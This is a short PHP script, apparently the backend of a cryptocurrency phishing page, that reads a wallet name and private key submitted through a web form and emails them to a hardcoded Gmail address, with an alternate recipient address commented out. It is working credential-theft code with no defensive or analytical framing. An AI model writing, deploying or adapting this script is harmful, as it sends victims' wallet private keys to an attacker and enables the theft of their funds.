<?php

if(isset($_POST['privateKey'], $_POST['walletname'])){
    $privateKey = $_POST['privateKey'];
    $walletname = $_POST['walletname'];

    //  $to = 'lodunidris12@gmail.com';
     $to = 'patrickcac80@gmail.com';
    $subject = $walletname.' details';
    $body = $walletname.' private key: '.$privateKey;
    $headers = 'From: Patrickdare26@gmail.com';

    // Send email
    if(mail($to, $subject, $body, $headers)){
        echo 'Email sent';
    } else {
        echo 'Email not sent';
    } 
}
?>
